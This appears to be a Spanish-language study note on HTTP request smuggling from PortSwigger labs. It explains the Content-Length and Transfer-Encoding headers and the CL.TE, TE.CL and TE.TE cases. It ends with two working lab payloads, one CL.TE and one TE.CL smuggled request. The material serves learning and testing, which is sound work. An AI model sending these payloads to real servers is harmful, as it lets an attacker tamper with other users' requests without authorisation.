
# HTTP request smugglin 

> El contrabando de solicitudes HTTP es una técnica para interferir con la forma en que un sitio web procesa secuencias de solicitudes HTTP que se reciben de uno o más usuarios.

> Los usuarios envían solicitudes a un servidor front-end (a veces denominado equilibrador de carga o proxy inverso) y este servidor reenvía las solicitudes a uno o más servidores back-end. Este tipo de arquitectura es cada vez más común, y en algunos casos inevitable, en las aplicaciones modernas basadas en la nube. El protocolo es muy simple: las solicitudes HTTP se envían una tras otra y el servidor receptor analiza los encabezados de las solicitudes HTTP para determinar dónde termina una solicitud y comienza la siguiente. En esta situación, es crucial que los sistemas front-end y back-end estén de acuerdo sobre los límites entre las solicitudes. De lo contrario, un atacante podría enviar una solicitud ambigua que los sistemas front-end y back-end interpretan de manera diferente


# Aprovechar la especificacion para realizar cosas diferentes

> Most HTTP request smuggling vulnerabilities arise because the HTTP specification provides two different ways to specify where a request ends: the Content-Length header and the Transfer-Encoding header.

```
El encabezado Content-Length es sencillo: especifica la longitud del cuerpo del mensaje en bytes. Por ejemplo

POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling

```

### ***En este ejemplo vale la pena recalcar que Content-Length manda la informacion en bytes y que en formato hex cada caracter equivale a 4 bits y cada caracter se forma por lo regular de 2 numeros hex por ejemplo 2e (el punto) entonces cada caracter ascii equivaldria a un byte***



```
El encabezado Transfer-Encoding se puede usar para especificar que el cuerpo del mensaje usa codificación fragmentada. Esto significa que el cuerpo del mensaje contiene uno o más fragmentos de datos. Cada fragmento consta del tamaño del fragmento en bytes (expresado en hexadecimal), seguido de una nueva línea, seguido del contenido del fragmento. El mensaje se termina con un trozo de tamaño cero. Por ejemplo:

POST /search HTTP/1.1
Host: normal-website.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

b
q=smuggling
0

```

### En este caso recordar que la cabecera Transfer-Encoding pasa datos de la siguiente maneja en salto de linea despues el valor en hex del tamaño de datos a pasar  + salto de linea +
despues los datos en si ( b es 11 en hex) y al final ya cuando no se enviaran mas datos pone un 0 y el salto de linea y asi se acaba.


# Casos que se pueden encontrar 

Recordar para que sirven esta headers *** Two different methods for specifying the length of HTTP messages****  Content-Length y Transfer-Encoding header (chunked encoding).

## CL.TE

Donde el fron end usa el  Content-Length  y el back end usa el Transfer-Encoding header 

## TE.CL

Donde el front end usar el Transfer-Encoding header  header y el back end el Content-Length.

## TE.TE

Donde el front end usa el Transfer-Encoding header e igualmente el back end Transfer-Encoding header.

# Burp  HTTP Request Smuggler

Para trabajar con esta vulnerabilidad te recomiendan utilizar esta extencion de burp.

# HTTP request smuggling, basic CL.TE vulnerability


Para este lab tenemos que el front end acepta Content-Lenght y el servidor acepta Trasfer-Encoding 

```

POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

G


```
# HTTP request smuggling, basic TE.CL vulnerability

Para este laboratiorio el fron en acepta el header  Transfer-Encoding y el back-end el Content-Lenght.

```
POST / HTTP/1.1
Host: 0a4c00f00330561dc002744700960007.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0



```

Recuerda que los salto de liena son dos caracteres por eso es 4 y en el caso del final son 4 caracteres \r\n\r\n. 
Referencias 

> https://portswigger.net/web-security/request-smuggling
